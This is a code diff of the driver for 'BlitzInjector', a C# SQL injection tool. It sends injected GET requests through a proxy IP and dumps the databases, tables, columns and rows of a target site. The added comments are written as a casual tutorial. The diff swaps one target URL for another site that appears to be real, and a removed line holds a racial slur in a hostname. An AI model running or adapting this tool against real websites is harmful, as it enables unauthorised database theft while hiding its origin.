@@ -14,11 +14,22 @@ namespace BlitzInjector
 
         public static void Main(string[] args)
         {
+            // Hello friends!~
+            // I'll just show you what I done.
+            // Here we create a dictionary that means key => value, it will be post to get submit
             var data = new Dictionary<string, string> {{"id", "1"}};
-            var grh = new GetRequestHandler(new Uri("http://nigga.freetzi.com/test.php"), data);
+            // we create a request handler to the url and we give him the data
+            // We also can give him a dictionary of headers
+            var grh = new GetRequestHandler(new Uri("http://amibehindaproxy.com"), data);
+            // Here we create the injection object with the request handler, we also give him the key
+            // the injection part will using the key
             var Injector = BlitzInjector.Create(grh, "id");
+            // Here we are initialzing the injector with a proxy and a port
+            Injector.Initilaize("186.94.3.95", 8080);
+            //Injector.Initilaize();
+            // And lets go~
             var Databases = Injector.FetchDatabases();
-            Console.WriteLine("Fetching databases in url(http://nigga.freetzi.com/test.php)...");
+            Console.WriteLine("Fetching databases in url(http://ohel-shem.com/library/)...");
             Console.WriteLine("DONE!");
             for (int i = 1; i < Databases.Length - 1; i++ )
                 Console.WriteLine(i + ") " + Databases[i]);
@@ -38,7 +49,7 @@ namespace BlitzInjector
                 Console.WriteLine(i + ") " + columns[i]);
             Console.WriteLine("Enter columns:");
             var column = Console.ReadLine();
-            Console.WriteLine("Fetching rows in {0}.{1} ({2})...", db, table, columns);
+            Console.WriteLine("Fetching rows in {0}.{1} ({2})...", db, table, column);
             var rows = Injector.FetchRows(db, table, column);
             Console.WriteLine("DONE!");
             var ColumnsArray = column.Split(',');
